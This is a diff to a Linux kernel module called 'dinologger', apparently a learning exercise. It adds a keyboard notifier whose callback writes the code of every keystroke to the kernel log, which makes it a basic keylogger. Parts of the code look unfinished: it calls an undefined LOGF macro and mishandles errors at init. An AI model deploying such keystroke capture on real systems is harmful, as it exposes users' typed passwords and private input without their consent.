@@ -2,6 +2,7 @@
 #include "linux/module.h"
 #include "linux/fs.h"
 #include "linux/miscdevice.h"
+#include "linux/keyboard.h"
 
 #define DEVICE_NAME "dinologger"
 #define LOG(msg) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n")
@@ -11,8 +12,17 @@ MODULE_LICENSE ("GPL");
 MODULE_AUTHOR("DinoMalin");
 
 ssize_t device_read(struct file *, char *, size_t, loff_t *);
+
 int register_device(void);
 void unregister_device(void);
+int __init m_init(void);
+void __exit m_exit(void);
+
+static int keyboard_notifier_call(struct notifier_block *nb,
+								  unsigned long code, void *_param);
+struct notifier_block keyboard_notifier_block = {
+	.notifier_call = keyboard_notifier_call
+};
 
 static const char buffer[] = "I'm a dinosaur";
 int buffer_size = sizeof(buffer);
@@ -55,14 +65,29 @@ ssize_t device_read(struct file *filep, char *user_buffer, size_t len, loff_t *o
 	return len;
 }
 
+static int keyboard_notifier_call(struct notifier_block *nb,
+								  unsigned long code, void *_param) {
+	struct keyboard_notifier_param *param = _param;
+	LOGF("keyboard entry ! code: %u", param->value);
+	return 0;
+}
+
 int __init m_init(void) {
 	LOG("trying to init");
-	register_device();
+	int err = 0;
+
+	err = register_device();
+	if (err)
+		return 0;
+	err = register_keyboard_notifier(&keyboard_notifier_block);
+	if (err)
+		unregister_device();
 	return 0;
 }
 
 void __exit m_exit(void) {
 	unregister_device();
+	unregister_keyboard_notifier(&keyboard_notifier_block);
 	return;
 }
 
